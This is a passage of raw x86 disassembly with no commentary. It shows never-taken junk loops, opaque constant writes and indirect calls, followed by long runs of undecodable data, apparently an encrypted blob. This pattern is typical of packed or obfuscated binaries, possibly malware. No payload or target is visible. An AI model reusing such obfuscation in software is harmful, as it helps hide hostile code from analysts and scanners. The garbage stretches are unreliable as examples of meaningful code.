  409ad7:	mov    DWORD PTR ds:0x43353f,edi
  409add:	jmp    0x409a8a
  409ae2:	add    DWORD PTR ds:0x43362b,0x300c
  409aec:	mov    edx,DWORD PTR [ebp+0x8]
  409aef:	and    DWORD PTR ds:0x4335a3,0x0
  409af9:	jmp    0x409b0b
  409afe:	mov    edi,DWORD PTR ds:0x4335a3
  409b04:	inc    edi
  409b05:	mov    DWORD PTR ds:0x4335a3,edi
  409b0b:	cmp    DWORD PTR ds:0x4335a3,0x1c
  409b12:	jae    0x409b5e
  409b18:	cmp    DWORD PTR ds:0x4335a3,0x5
  409b1f:	jne    0x409b33
  409b25:	push   0x776c
  409b2a:	push   DWORD PTR [ebp-0x18]
  409b2d:	call   DWORD PTR ds:0x41219c
  409b33:	cmp    DWORD PTR ds:0x4335a3,0x4
  409b3a:	jne    0x409b4f
  409b40:	xor    edi,edi
  409b42:	xor    edi,DWORD PTR ds:0x4335a3
  409b48:	inc    edi
  409b49:	mov    DWORD PTR ds:0x4335a3,edi
  409b4f:	jmp    0x409afe
  409b54:	or     DWORD PTR ds:0x433617,0x2a5
  409b5e:	xor    edx,eax
  409b60:	or     edi,DWORD PTR ds:0x433597
  409b66:	add    edx,ecx
  409b68:	xor    edi,edi
  409b6a:	add    edi,DWORD PTR ds:0x43362f
  409b70:	or     edi,DWORD PTR ds:0x43359f
  409b76:	mov    DWORD PTR ds:0x43362f,edi
  409b7c:	mov    DWORD PTR [ebp+0xc],edx
  409b7f:	and    DWORD PTR ds:0x4335a3,0x414e
  409b89:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  409b90:	xor    edx,edx
  409b92:	xor    edx,DWORD PTR ds:0x433673
  409b98:	and    edx,DWORD PTR ds:0x433557
  409b9e:	mov    DWORD PTR ds:0x433673,edx
  409ba4:	mov    DWORD PTR [ebp-0x28],0xf89c853b
  409bab:	mov    DWORD PTR ds:0x4335af,0x15
  409bb5:	cmp    DWORD PTR ds:0x4335af,0x0
  409bbc:	je     0x409c5d
  409bc2:	cmp    DWORD PTR ds:0x4335af,0x2
  409bc9:	jne    0x409bde
  409bcf:	push   DWORD PTR [ebp-0x28]
  409bd2:	push   DWORD PTR [ebp-0x18]
  409bd5:	push   DWORD PTR [ebp-0x10]
  409bd8:	call   DWORD PTR ds:0x412264
  409bde:	cmp    DWORD PTR ds:0x4335af,0x3
  409be5:	jne    0x409bf8
  409beb:	mov    edi,DWORD PTR ds:0x4335af
  409bf1:	dec    edi
  409bf2:	mov    DWORD PTR ds:0x4335af,edi
  409bf8:	mov    edi,DWORD PTR ds:0x4335af
  409bfe:	dec    edi
  409bff:	mov    DWORD PTR ds:0x4335af,edi
  409c05:	jmp    0x409bb5
  409c0a:	and    DWORD PTR ds:0x4335a3,0x0
  409c14:	jmp    0x409c26
  409c19:	mov    edi,DWORD PTR ds:0x4335a3
  409c1f:	inc    edi
  409c20:	mov    DWORD PTR ds:0x4335a3,edi
  409c26:	cmp    DWORD PTR ds:0x4335a3,0x13
  409c2d:	jae    0x409c5d
  409c33:	cmp    DWORD PTR ds:0x4335a3,0x17
  409c3a:	jne    0x409c58
  409c40:	push   0x43375d
  409c45:	push   0x433767
  409c4a:	push   DWORD PTR [ebp-0x1c]
  409c4d:	push   0x22b4
  409c52:	call   DWORD PTR ds:0x412268
  409c58:	jmp    0x409c19
  409c5d:	mov    DWORD PTR [ebp-0x2c],0xf89c853a
  409c64:	mov    DWORD PTR [ebp-0x30],0xf89c8539
  409c6b:	jmp    0x409fde
  409c70:	push   edx
  409c71:	jle    0x409c60
  409c73:	and    al,0x7d
  409c75:	jecxz  0x409cd4
  409c77:	push   0xffffffb4
  409c79:	inc    edx
  409c7a:	push   ds
  409c7b:	imul   eax,DWORD PTR [edi+0x1b],0xee654634
  409c82:	jl     0x409d00
  409c84:	retf   0x7c79
  409c87:	jl     0x409c6e
  409c89:	in     eax,dx
  409c8a:	mov    al,ds:0x1bbb2f41
  409c8f:	xchg   edi,eax
  409c90:	or     eax,0xb04ffd8c
  409c95:	mov    esi,0xd3c4e619
  409c9a:	mov    al,0xfb
  409c9c:	cmc    
  409c9d:	hlt    
  409c9e:	mov    al,ds:0x250bfd4c
  409ca3:	popf   
  409ca4:	push   esi
  409ca5:	push   ecx
  409ca6:	popa   
  409ca7:	std    
  409ca8:	int    0x52
  409caa:	mov    esi,0x6bb6c3cb
  409caf:	push   edi
  409cb0:	xchg   ebp,eax
  409cb1:	mov    edi,0xdee7ab12
  409cb6:	or     ah,cl
  409cb8:	adc    al,BYTE PTR [esi+0x29]
  409cbb:	pop    ebx
  409cbc:	xchg   DWORD PTR [esi],edx
  409cbe:	test   DWORD PTR [edx],0xd0a7c88a
  409cc4:	jnp    0x409d2b
  409cc6:	mov    ds:0xe18d7b12,al
  409ccb:	xchg   ebx,eax
  409ccc:	push   eax
  409ccd:	xlat   BYTE PTR ds:[ebx]
  409cce:	js     0x409cf7
  409cd0:	or     edi,edi
  409cd2:	bound  ebp,QWORD PTR [esi+0x20]
  409cd5:	repz inc esi
  409cd7:	sub    al,0x6e
  409cd9:	loopne 0x409ce7
  409cdb:	mov    edx,0x2f99100a
  409ce0:	je     0x409cf7
  409ce2:	mov    esp,0xcd3d444d
  409ce7:	mov    bh,0xc8
  409ce9:	jl     0x409c7d
  409ceb:	shl    BYTE PTR [ebx+0x4a3c6759],cl
  409cf1:	ret    
  409cf2:	pop    esi
  409cf3:	xchg   esi,eax
  409cf4:	cmp    DWORD PTR [esi+0x26],esi
  409cf7:	imul   ecx,ecx,0xc41d82a2
  409cfd:	aas    
  409cfe:	jns    0x409c97
  409d00:	push   eax
  409d01:	adc    eax,DWORD PTR [ebp+0x7fc6e67a]
  409d07:	cmc    
  409d08:	imul   DWORD PTR [eax]
  409d0a:	imul   esi,DWORD PTR [ebp+edi*4-0x2902d5fd],0xfe860b96
  409d15:	enter  0x97f9,0xbe
  409d19:	sub    eax,0xa04aa00e
  409d1e:	test   DWORD PTR [edx+0x51],esi
  409d21:	push   DWORD PTR [ecx]
  409d23:	lods   al,BYTE PTR ds:[esi]
  409d24:	mov    ch,bh
  409d26:	enter  0xffe5,0xc2
  409d2a:	cmp    al,0x10
  409d2c:	addr16 ret 0x1f0
  409d30:	loop   0x409d5a
  409d32:	or     bh,BYTE PTR [eax+0x1cf5b73]
  409d38:	(bad)  
  409d39:	or     eax,0x66e424c8
  409d3e:	(bad)  
  409d3f:	jl     0x409cff
  409d41:	jae    0x409d4b
  409d43:	mov    WORD PTR [esi+0x15e270],ss
  409d49:	in     al,0x89
  409d4b:	dec    ebx
  409d4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d4d:	enter  0x5834,0x45
  409d51:	inc    esi
  409d52:	lahf   
  409d53:	or     cl,BYTE PTR [ecx+0x3]
  409d56:	mov    ds:0x87308fab,eax
  409d5b:	cmp    BYTE PTR [eax-0x54],ch
  409d5e:	mov    cx,0x7ba4
  409d62:	xchg   BYTE PTR [edx],bh
  409d64:	mov    edx,0x4b831681
  409d69:	ins    BYTE PTR es:[edi],dx
  409d6a:	add    al,0xbf
  409d6c:	xchg   ebp,eax
  409d6d:	enter  0xf584,0x15
  409d71:	cmc    
  409d72:	fmul   QWORD PTR [edi+0x20]
  409d75:	xchg   esi,eax
  409d76:	fwait
  409d77:	mov    ebx,0x2ed60988
  409d7c:	xor    dh,BYTE PTR [ebp+0x3dd81c01]
  409d82:	inc    ebx
  409d83:	dec    edx
  409d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d85:	mov    ebx,0x812523cf
  409d8a:	pushf  
  409d8b:	inc    ecx
  409d8c:	mov    edx,0x3f06dff
  409d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d92:	fdiv   QWORD PTR [esi]
  409d94:	adc    DWORD PTR [ecx-0x1a0094b6],ebx
  409d9a:	and    eax,0x3a94e84e
  409d9f:	add    BYTE PTR [edi-0x54],bl
  409da2:	cwde   
  409da3:	pop    ebx
  409da4:	leave  
  409da5:	shr    cl,0xde
  409da8:	push   cs
  409da9:	ret    
  409daa:	push   ecx
  409dab:	sub    al,0x6d
  409dad:	push   esp
  409dae:	ss test eax,0x3acb630b
  409db4:	stos   BYTE PTR es:[edi],al
  409db5:	cmp    dl,BYTE PTR [edx+edi*8+0x3e]
  409db9:	dec    edi
  409dba:	mov    WORD PTR [esi],ss
  409dbc:	in     al,dx
  409dbd:	sar    DWORD PTR [esi],0x12
  409dc0:	stc    
  409dc1:	jae    0x409dee
  409dc3:	xor    dh,0xe8
  409dc6:	sub    eax,0xc01f8f2f
  409dcb:	retf   
  409dcc:	push   0x34
  409dce:	push   cs
  409dcf:	aad    0xc0
  409dd1:	rol    BYTE PTR [ecx+0x26968758],cl
  409dd7:	push   esp
  409dd8:	and    eax,DWORD PTR [eax+0x7228e933]
  409dde:	hlt    
  409ddf:	rcr    DWORD PTR [esi-0x65],1
  409de2:	cmc    
  409de3:	push   esp
  409de5:	xor    al,0xb3
  409de7:	mov    cs,WORD PTR [ebp-0x72]
  409dea:	scas   eax,DWORD PTR es:[edi]
  409deb:	lods   al,BYTE PTR ds:[esi]
  409dec:	or     cl,BYTE PTR [ecx-0x147f4b65]
  409df2:	cmc    
  409df3:	dec    esi
  409df4:	adc    BYTE PTR [ebp+0x24631370],dh
  409dfa:	(bad)
  409dfd:	hlt    
  409dfe:	fwait
  409dff:	dec    edi
  409e00:	xchg   DWORD PTR [edi-0x5ad9de3],edi
  409e06:	mov    dl,0xf0
  409e08:	dec    esp
  409e09:	jbe    0x409e43
  409e0b:	adc    ecx,DWORD PTR [ebp+0x2f]
  409e0e:	xchg   ebp,eax
  409e0f:	fnstenv [eax+0xd3df84]
  409e15:	mov    dl,0x94
  409e17:	push   0x525411f4
  409e1c:	push   esp
  409e1d:	mov    DWORD PTR [edx],edi
  409e1f:	test   DWORD PTR [eax],ebx
  409e21:	dec    eax
  409e22:	mov    dh,0x97
  409e24:	cs jne 0x409e1c
  409e27:	lods   al,BYTE PTR ds:[esi]
  409e28:	gs pusha 
  409e2a:	fnstenv [ebx]
  409e2c:	cmp    al,0x81
  409e2e:	xlat   BYTE PTR ds:[ebx]
  409e2f:	lahf   
  409e30:	dec    ecx
  409e31:	xchg   DWORD PTR [eax+0x41c40e3],ebp
  409e37:	fwait
  409e38:	mov    esi,DWORD PTR [ecx+0x6f19414f]
  409e3e:	out    dx,eax
  409e3f:	pop    ecx
  409e40:	mov    fs,WORD PTR [esi]
  409e42:	dec    eax
  409e43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e44:	pop    ecx
  409e45:	fucomi st,st(4)
  409e47:	xor    dh,BYTE PTR [edx-0x1d]
  409e4a:	aas    
  409e4b:	xor    BYTE PTR [edx+ebx*1-0x72],cl
  409e4f:	jge    0x409ec1
  409e51:	ins    BYTE PTR es:[edi],dx
  409e52:	add    eax,0xab1d3b46
  409e57:	nop
  409e58:	mov    esi,0xd5160c44
  409e5d:	jbe    0x409e8e
  409e5f:	es dec ebx
  409e61:	xchg   ebp,eax
  409e62:	(bad)  
  409e63:	xchg   ebx,eax
  409e64:	push   ss
  409e65:	shr    BYTE PTR [ebx],cl
  409e67:	loope  0x409e5b
  409e69:	aam    0xec
  409e6b:	push   0x34
  409e6d:	push   esp
  409e6e:	jmp    0x40c2ae94
  409e73:	scas   al,BYTE PTR es:[edi]
  409e74:	push   cs
  409e75:	push   cs
  409e76:	and    DWORD PTR [esi-0xe],0xad95d0d1
  409e7d:	imul   ebp,ebp,0xdcc54cc5
  409e83:	and    esp,DWORD PTR [ecx+0x4dbc3318]
  409e89:	ins    BYTE PTR es:[edi],dx
  409e8a:	mov    ebp,0xa6fa52fa
  409e8f:	das    
  409e90:	xchg   ebp,eax
  409e91:	in     al,0xcc
  409e93:	mov    eax,0x690e2bae
  409e98:	je     0x409f0a
  409e9a:	xor    dl,ah
  409e9c:	test   DWORD PTR [edx+0x1d093e44],ecx
  409ea2:	(bad)  
  409ea3:	push   cs
  409ea4:	or     DWORD PTR ss:[edi-0x37],eax
  409ea8:	pop    eax
  409ea9:	jnp    0x409e9f
  409eab:	dec    ecx
  409eac:	int3   
  409ead:	aas    
  409eae:	pop    ebx
  409eaf:	retf   
  409eb0:	fidiv  DWORD PTR [eax+0x3d]
  409eb3:	aam    0x7e
  409eb5:	dec    eax
  409eb6:	adc    DWORD PTR [ecx+0x5e],ebp
  409eb9:	adc    BYTE PTR [edx+eiz*2+0x64],dl
  409ebd:	push   ebp
  409ebe:	pop    edx
  409ebf:	or     ah,BYTE PTR [eax-0x13f800f5]
  409ec5:	ins    DWORD PTR es:[edi],dx
  409ec6:	ret    0xf66f
  409ec9:	add    cl,dh
  409ecb:	push   cs
  409ecc:	loopne 0x409f3b
  409ece:	mov    cl,0xf5
  409ed0:	sbb    edi,DWORD PTR [edx]
  409ed2:	dec    eax
  409ed3:	adc    al,0x62
  409ed6:	and    BYTE PTR [ebx],ch
  409ed8:	fnstsw WORD PTR [ebx+edx*1+0x5c]
  409edc:	jle    0x409eb7
  409ede:	mov    ebx,0x8cc4bd4e
  409ee3:	cmp    al,0xed
  409ee5:	call   FWORD PTR [ecx+0x23faf6c2]
  409eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eec:	dec    edi
  409eed:	pop    ds
  409eee:	push   edi
  409eef:	dec    ebp
  409ef0:	xor    BYTE PTR ds:0xa094d5c4,ah
  409ef6:	(bad)  
  409ef7:	enter  0xdd51,0x99
  409efb:	add    al,0x88
  409efd:	jno    0x409e91
  409eff:	shl    BYTE PTR [edi-0x17d449a2],0xba
  409f06:	push   cs
  409f07:	pop    ss
  409f08:	cmp    DWORD PTR [edx+0x21],0x46
  409f0c:	push   eax
  409f0d:	std    
  409f0e:	ficom  WORD PTR [ebx]
  409f10:	ret    
  409f11:	adc    ah,BYTE PTR [edi+0xa]
  409f14:	cmp    ch,al
  409f16:	pop    ecx
  409f17:	in     al,0xab
  409f19:	popf   
  409f1a:	sbb    cl,BYTE PTR [ebx+0x33]
  409f1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f1e:	push   ecx
  409f1f:	dec    ebp
  409f20:	rol    BYTE PTR [edi+0x66],cl
  409f23:	push   ebp
  409f24:	pop    ebp
  409f25:	iret   
  409f26:	fnstsw WORD PTR [ecx]
  409f28:	add    ebp,esi
  409f2a:	data16 fs mov dh,0x5c
  409f2e:	sbb    eax,0xbaf8d5a
  409f33:	ret    
  409f34:	pop    ebx
  409f35:	sbb    DWORD PTR [eax+edx*1+0x2edcf904],0x3a
  409f3d:	adc    DWORD PTR [ecx-0x54],edx
  409f40:	mov    ecx,DWORD PTR [esi]
  409f42:	mov    bh,0x6d
  409f44:	jae    0x409ef1
  409f46:	int    0xe2
  409f48:	add    ecx,DWORD PTR [ebx-0x5ceaa434]
  409f4e:	jo     0x409f69
  409f50:	cs mov esi,ebp
  409f53:	mov    ebx,0x35ae893c
  409f58:	cmp    DWORD PTR [edx+0x3570fcde],0x4b7880a6
  409f62:	out    dx,al
  409f63:	push   esp
  409f64:	pop    ss
  409f65:	pop    esp
  409f66:	enter  0x242f,0x2a
  409f6a:	(bad)  
  409f6b:	pop    ds
  409f6c:	and    DWORD PTR [bp+di],0x58ad2301
  409f73:	mov    esp,0xde7b5e3
  409f78:	cli    
  409f79:	jb     0x409fe4
  409f7b:	pop    eax
  409f7c:	add    al,0xb4
  409f7e:	(bad)  
  409f7f:	in     al,0x57
  409f81:	mov    ecx,0x1df8c78a
  409f86:	jle    0x409f7f
  409f88:	fidivr WORD PTR [eax]
  409f8a:	xchg   esp,eax
  409f8b:	call   0x3c3c2e3a
  409f90:	loopne 0x409f7b
  409f92:	test   BYTE PTR [eax+0xd],0xa7
  409f96:	mov    cl,0xfa
  409f98:	adc    DWORD PTR [ebx-0xfced19f],ebp
  409f9e:	(bad)  
  409f9f:	out    dx,al
  409fa0:	cmp    edi,eax
  409fa2:	sbb    ah,BYTE PTR [esi+0x1042908e]
  409fa8:	cld    
  409fa9:	sub    al,0x28
  409fab:	mov    BYTE PTR [esi+0x43306c6d],dl
  409fb1:	xor    DWORD PTR [ebp-0x2c],edx
  409fb4:	push   eax
  409fb5:	sub    DWORD PTR [eax],esi
  409fb7:	jl     0x40a013
  409fb9:	mov    ecx,0x97033442
  409fbe:	call   0x46864667
  409fc3:	push   0x2f70be59
  409fc8:	push   ss
  409fc9:	mov    edx,0x763c071c
  409fce:	cld    
  409fcf:	jl     0x40a003
  409fd1:	ja     0x409ffb
  409fd3:	in     eax,0xe3
  409fd5:	jecxz  0x409f93
  409fd7:	inc    ebp
  409fd8:	fstp   DWORD PTR [esi-0x229de22e]
  409fde:	mov    DWORD PTR [ebp-0x34],0xf89c8538
  409fe5:	and    DWORD PTR ds:0x433623,0x0
  409fef:	jmp    0x40a001
  409ff4:	mov    edx,DWORD PTR ds:0x433623
  409ffa:	inc    edx
  409ffb:	mov    DWORD PTR ds:0x433623,edx
  40a001:	cmp    DWORD PTR ds:0x433623,0x16
  40a008:	jae    0x40a02b
  40a00e:	cmp    DWORD PTR ds:0x433623,0x18
  40a015:	jne    0x40a026
  40a01b:	push   0x35b9
  40a020:	call   DWORD PTR ds:0x41226c
  40a026:	jmp    0x409ff4
  40a02b:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a032:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a039:	movzx  edx,BYTE PTR ds:0x433673
  40a040:	adc    edx,DWORD PTR ds:0x43362b
  40a046:	mov    DWORD PTR ds:0x433673,edx
  40a04c:	mov    edx,DWORD PTR [ebp+0x8]
  40a04f:	xor    edx,eax
  40a051:	mov    edi,DWORD PTR [ebp-0x10]
  40a054:	add    edx,ecx
  40a056:	cmp    edi,edx
  40a058:	je     0x40d768
  40a05e:	mov    DWORD PTR ds:0x433557,0x2fff
  40a068:	push   ebx
  40a069:	jmp    0x40d743
  40a06e:	movzx  edi,BYTE PTR ds:0x4335df
  40a075:	xor    DWORD PTR ds:0x4335b3,edi
  40a07b:	mov    edx,DWORD PTR [ebp-0x8]
  40a07e:	mov    edi,DWORD PTR [ebp-0x10]
  40a081:	sub    DWORD PTR ds:0x433553,0x7416
  40a08b:	sub    edi,edx
  40a08d:	movzx  edx,WORD PTR ds:0x43366b
  40a094:	xor    DWORD PTR ds:0x43365b,edx
  40a09a:	jmp    0x40a40d
  40a09f:	push   edi
  40a0a0:	mov    dh,0x10
  40a0a2:	sti    
  40a0a3:	std    
  40a0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a5:	push   edi
  40a0a6:	jb     0x40a085
  40a0a8:	xor    dl,BYTE PTR [ecx+0x4e]
  40a0ab:	jo     0x40a127
  40a0ad:	adc    eax,0x7cea336d
  40a0b2:	jl     0x40a07e
  40a0b4:	jns    0x40a132
  40a0b6:	jl     0x40a0f4
  40a0b8:	add    bh,bh
  40a0ba:	in     al,0xcf
  40a0bc:	sti    
  40a0bd:	dec    esp
  40a0be:	(bad)  
  40a0bf:	cli    
  40a0c0:	test   DWORD PTR [ecx],ebx
  40a0c2:	push   ds
  40a0c3:	shl    BYTE PTR [edi-0x48],0x47
  40a0c7:	daa    
  40a0c8:	int    0xfc
  40a0ca:	push   0x4fab41da
  40a0cf:	(bad)  
  40a0d0:	adc    al,0xa6
  40a0d2:	(bad)  
  40a0d3:	cmp    al,0xaa
  40a0d5:	call   0xac83e8f0
  40a0da:	int3   
  40a0db:	sbb    bl,al
  40a0dd:	mov    ebp,0x16e098ea
  40a0e2:	xor    eax,ecx
  40a0e4:	int3   
  40a0e5:	sub    eax,0xc1d68242
  40a0ea:	xchg   esi,eax
  40a0eb:	xchg   esp,eax
  40a0ec:	mov    esi,0xbc139722
  40a0f1:	dec    ecx
  40a0f2:	scas   eax,DWORD PTR es:[edi]
  40a0f3:	out    dx,al
  40a0f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0f5:	data16 gs cmp dl,dl
  40a0f9:	int    0xb2
  40a0fb:	(bad)  
  40a0fc:	pop    esi
  40a0fd:	sbb    al,BYTE PTR [esi]
  40a0ff:	(bad)  
  40a100:	jo     0x40a0d3
  40a102:	dec    eax
  40a103:	imul   eax,DWORD PTR [edx-0x61],0xddfc9364
  40a10a:	int    0x5
  40a10c:	add    BYTE PTR [ebx-0x68],bh
  40a10f:	fmul   DWORD PTR [eax+ebp*1-0x4f]
  40a113:	je     0x40a0d9
  40a115:	loope  0x40a105
  40a117:	fbld   TBYTE PTR [edi-0x51]
  40a11a:	repnz (bad) 
  40a11c:	or     al,0xf5
  40a11e:	cmp    ch,BYTE PTR [ecx]
  40a120:	mov    ds:0x430f71a2,al
  40a125:	jo     0x40a12d
  40a127:	dec    edx
  40a128:	pop    edx
  40a129:	push   0x34
  40a12b:	sub    eax,0xb7558e18
  40a130:	cmc    
  40a131:	imul   esp,DWORD PTR [ebx+0x774fc96b],0x50ad5d09
  40a13b:	jae    0x40a116
  40a13d:	mov    esp,0x965a6746
  40a142:	arpl   WORD PTR [esi+0x66],si
  40a145:	clc    
  40a146:	pop    esp
  40a147:	mov    al,ds:0x95172e3
  40a14c:	cmc    
  40a14d:	and    edi,DWORD PTR [esi-0xd3fa575]
  40a153:	fld    TBYTE PTR [ecx-0x72be6ff6]
  40a159:	dec    ebp
  40a15a:	mov    ds:0x45313e7,eax
  40a15f:	sbb    BYTE PTR [edx+0x70f22450],dh
  40a165:	jecxz  0x40a1b3
  40a167:	in     eax,dx
  40a168:	in     al,dx
  40a169:	pop    ecx
  40a16a:	popa   
  40a16b:	inc    bx
  40a16d:	fld    TBYTE PTR [eax+0x4d]
  40a170:	lods   eax,DWORD PTR ds:[esi]
  40a171:	(bad)  
  40a172:	sbb    BYTE PTR ds:0xf08b7d20,cl
  40a178:	mov    ebx,0xdf8b83a7
  40a17d:	imul   ebp,DWORD PTR [edi+0x2c],0xbf24e8b6
  40a184:	inc    ebx
  40a185:	mov    ebx,0xd2f1a17a
  40a18a:	cmp    cl,BYTE PTR [edx-0x3d]
  40a18d:	test   DWORD PTR [eax-0x498a187e],0xf3ff8437
  40a197:	bound  edx,QWORD PTR [ecx+0x6964046c]
  40a19d:	sbb    esp,eax
  40a19f:	cmp    DWORD PTR [ecx+esi*2],esi
  40a1a2:	inc    esi
  40a1a3:	test   BYTE PTR [esi+edi*2+0x5ab35791],dh
  40a1aa:	sub    al,0xa3
  40a1ac:	test   BYTE PTR [edi+0x73],dh
  40a1af:	inc    edi
  40a1b0:	inc    BYTE PTR [ebp+eiz*1+0x682f9b35]
  40a1b7:	jge    0x40a1df
  40a1b9:	sbb    BYTE PTR [edx-0x35],dl
  40a1bc:	lahf   
  40a1bd:	test   al,0x4e
  40a1bf:	push   edx
  40a1c0:	rcr    bh,cl
  40a1c2:	(bad)  
  40a1c4:	xchg   esi,eax
  40a1c5:	cwde   
  40a1c6:	xchg   ecx,eax
  40a1c7:	popa   
  40a1c8:	ret    
  40a1c9:	jg     0x40a198
  40a1cb:	cmp    cl,BYTE PTR [esi]
  40a1cd:	sub    edi,DWORD PTR [edx+0x1d831f14]
  40a1d3:	test   al,0xc7
  40a1d5:	pop    eax
  40a1d6:	mov    ch,0xb5
  40a1d8:	in     eax,dx
  40a1d9:	sahf   
  40a1da:	fwait
  40a1db:	clc    
  40a1dc:	shr    BYTE PTR [ebx-0x7d501a42],cl
  40a1e2:	pop    ebx
  40a1e3:	push   edi
  40a1e4:	lock xchg edx,eax
  40a1e6:	add    al,dh
  40a1e8:	cmp    DWORD PTR [ecx+0x9],esp
  40a1eb:	mov    ds:0x714745a6,al
  40a1f0:	stos   DWORD PTR es:[edi],eax
  40a1f1:	mov    al,0x7
  40a1f3:	mov    ah,0xfb
  40a1f5:	lea    edi,[edi]
  40a1f7:	or     eax,0x3d701216
  40a1fc:	stc    
  40a1fd:	and    ebp,esi
  40a1ff:	or     eax,0xeed63520
  40a204:	add    BYTE PTR [ebp+ebx*2+0x3d757cf4],bl
  40a20b:	and    ebp,edi
  40a20d:	push   ebx
  40a20e:	call   FWORD PTR [ebp-0x6db45f11]
  40a214:	cli    
  40a215:	dec    edi
  40a216:	dec    ebp
  40a217:	adc    al,0x64
  40a219:	adc    DWORD PTR [ecx+0x18],esi
  40a21c:	add    ebp,esp
  40a21e:	add    eax,0x55087907
  40a223:	or     esi,ecx
  40a225:	mov    bh,dl
  40a227:	ficom  WORD PTR [edi+0x424b30a6]
  40a22d:	mov    dh,0x4a
  40a22f:	sets   al
  40a232:	jle    0x40a22f
  40a234:	popa   
  40a235:	(bad)  
  40a236:	sti    
  40a237:	stos   BYTE PTR es:[edi],al
  40a238:	jne    0x40a247
  40a23a:	inc    ebp
  40a23b:	cld    
  40a23c:	test   al,0x1b
  40a23e:	aaa    
  40a23f:	popa   
  40a240:	push   esi
  40a241:	sar    BYTE PTR ds:0xaae9b1ae,0x90
  40a248:	pushf  
  40a249:	retf   0xea0a
  40a24c:	fst    QWORD PTR [ecx+0x4]
  40a24f:	inc    ebx
  40a250:	push   es
  40a251:	mov    esi,0x75fc805c
  40a256:	(bad)  
  40a257:	xchg   ebp,eax
  40a258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a259:	add    BYTE PTR [eax+0x4ddef76b],ch
  40a25f:	mov    al,ds:0x85e37b58
  40a264:	push   0x6f4b24ba
  40a269:	rcl    DWORD PTR [edx],cl
  40a26b:	hlt    
  40a26c:	ja     0x40a283
  40a26e:	pop    ebp
  40a26f:	xor    BYTE PTR [ebx+0x50],bh
  40a272:	cmp    al,0x71
  40a274:	cmp    DWORD PTR [edi-0x4b],0x7a767fce
  40a27b:	mov    bh,0x26
  40a27d:	retf   
  40a27e:	xchg   ebx,eax
  40a27f:	inc    edi
  40a280:	fist   DWORD PTR [edi+0x282740d1]
  40a286:	adc    BYTE PTR ds:0xa24868bf,dl
  40a28c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a28d:	adc    al,cl
  40a28f:	mov    edi,0xdac0f4d1
  40a294:	js     0x40a22a
  40a296:	mov    BYTE PTR [ebx-0x1c32c972],cl
  40a29c:	jl     0x40a2d5
  40a29e:	dec    eax
  40a29f:	addr16 retf 0xcc23
  40a2a3:	pop    edi
  40a2a4:	jb     0x40a31d
  40a2a6:	mov    WORD PTR [eax+0x40],es
  40a2a9:	jo     0x40a23e
  40a2ab:	test   BYTE PTR [edi-0x5d],0x33
  40a2af:	add    DWORD PTR ds:0x3f7f27fa,edx
  40a2b5:	ret    
  40a2b6:	fidiv  WORD PTR [ebx-0x381fdeed]
  40a2bc:	mov    dh,0xe9
  40a2be:	xchg   ebx,eax
  40a2bf:	es and eax,0xb5bd5800
  40a2c5:	adc    ah,0xb0
  40a2c8:	dec    ebx
  40a2c9:	xchg   DWORD PTR [ecx+0x24],esi
  40a2cc:	cli    
  40a2cd:	std    
  40a2ce:	fimul  DWORD PTR [edi-0xb]
  40a2d1:	jmp    0x40a311
  40a2d3:	stos   DWORD PTR es:[edi],eax
  40a2d4:	xchg   ebp,eax
  40a2d5:	or     edi,ebp
  40a2d7:	xor    al,0x1d
  40a2d9:	add    esi,edx
  40a2db:	dec    ebp
  40a2dc:	push   ds
  40a2dd:	or     eax,0x681be98c
  40a2e2:	test   DWORD PTR [edi-0x70],0x303ee629
  40a2e9:	jle    0x40a366
  40a2eb:	int3   
  40a2ec:	add    dl,BYTE PTR ss:[edx+0x2c]
  40a2f0:	and    al,0xbd
  40a2f2:	scas   al,BYTE PTR es:[edi]
  40a2f3:	test   al,0x59
  40a2f5:	jb     0x40a2bd
  40a2f7:	shr    bh,1
  40a2f9:	add    DWORD PTR [edi-0x1209e662],edx
  40a2ff:	mov    bh,0xbd
  40a301:	fldcw  WORD PTR [ebx]
  40a303:	std    
  40a304:	test   BYTE PTR [ebp+0x7c1f6edf],dh
  40a30a:	inc    esi
  40a30b:	pushf  
  40a30c:	out    0x8e,eax
  40a30e:	dec    esp
  40a30f:	cwde   
  40a310:	rol    ch,1
  40a312:	add    ch,BYTE PTR [eax+0x69]
  40a315:	nop
  40a316:	and    bh,dl
  40a318:	lds    esp,FWORD PTR [eax]
  40a31a:	enter  0xbce6,0x3f
  40a31e:	or     bl,0x46
  40a321:	xor    dh,BYTE PTR [eax]
  40a323:	pop    eax
  40a324:	cmp    al,0x88
  40a326:	test   ebx,ecx
  40a328:	js     0x40a32d
  40a32a:	push   ss
  40a32b:	add    DWORD PTR [edx],edi
  40a32d:	dec    esi
  40a32e:	push   ebx
  40a32f:	jmp    0x41f7:0xc5b2a6d8
  40a336:	pushf  
  40a337:	shl    bl,0x8f
  40a33a:	xchg   ebp,eax
  40a33b:	jae    0x40a2d3
  40a33d:	and    cl,BYTE PTR [eax+ebp*4-0x107c291]
  40a344:	pop    edi
  40a345:	sub    BYTE PTR [ebx],al
  40a347:	(bad)  
  40a348:	jae    0x40a3ab
  40a34a:	std    
  40a34b:	sub    al,0xf8
  40a34d:	pop    es
  40a34e:	pop    esi
  40a34f:	jl     0x40a31e
  40a351:	dec    eax
  40a352:	jne    0x40a3bb
  40a354:	out    dx,al
  40a355:	add    esi,DWORD PTR [edx]
  40a357:	add    bh,BYTE PTR ds:0x523f5e0c
  40a35d:	inc    ebx
  40a35e:	repz mov dl,0xa7
  40a361:	xchg   esp,eax
  40a362:	loope  0x40a346
  40a364:	mov    eax,0x53c651ca
  40a369:	stos   DWORD PTR es:[edi],eax
  40a36a:	jnp    0x40a375
  40a36c:	jl     0x40a35d
  40a36e:	adc    al,BYTE PTR [edi]
  40a370:	(bad)  
  40a371:	inc    esi
  40a372:	add    eax,0x43797fe3
